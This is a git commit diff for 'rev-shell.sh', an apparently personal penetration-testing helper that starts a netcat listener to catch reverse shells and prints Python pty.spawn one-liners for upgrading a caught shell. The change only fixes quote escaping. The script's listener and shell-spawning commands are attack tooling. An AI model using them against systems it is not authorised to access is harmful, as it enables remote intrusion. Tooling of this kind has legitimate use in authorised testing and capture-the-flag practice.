4f2991cd4ea9e9c43c85428e1a60e6e9af214de0
DcardosoGH <diogo.g.c@gmail.com>
2023-05-30 22:34:35 +0100

    ++

--- rev-shell.sh
+++ rev-shell.sh
@@ -2,6 +2,6 @@
 ## to be used with alias rev $portNumber
 
 echo "Starting Revshell on port $1";
-echo "python3 -c 'import pty;pty.spawn("/bin/bash")';";
-echo "python3 -c 'import pty;pty.spawn("/bin/sh")';";
+echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';"
+echo "python3 -c 'import pty;pty.spawn(\"/bin/sh\")';"
 rlwrap nc -lnvp $1;
